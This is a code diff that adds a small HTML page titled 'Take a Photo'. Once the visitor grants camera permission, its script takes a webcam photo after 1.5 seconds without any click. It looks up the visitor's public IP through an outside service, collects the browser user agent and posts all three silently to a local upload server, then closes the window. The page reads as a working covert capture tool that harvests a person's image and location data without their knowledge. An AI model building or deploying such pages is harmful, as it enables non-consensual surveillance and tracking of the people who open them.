@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Take a Photo</title>
+</head>
+<body>
+    <video id="video" width="320" height="240" autoplay playsinline></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        async function getIpAddress() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return "Unknown";
+            }
+        }
+
+        function getDeviceName() {
+            return navigator.userAgent;
+        }
+
+        async function takePhotoAndSend() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            const stream = video.srcObject;
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            const deviceName = getDeviceName();
+            const ipAddress = await getIpAddress();
+
+            fetch('http://127.0.0.1:5000/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    image: imageData,
+                    device_name: deviceName,
+                    ip_address: ipAddress
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    window.close();  // Will only work if page opened by JS
+                } else {
+                    console.error('Upload failed:', data.message);
+                }
+            })
+            .catch(error => {
+                console.error('Fetch error:', error);
+            });
+        }
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(takePhotoAndSend, 1500);
+                };
+            })
+            .catch(error => {
+                console.error("Camera error:", error);
+            });
+    </script>
+</body>
+</html>
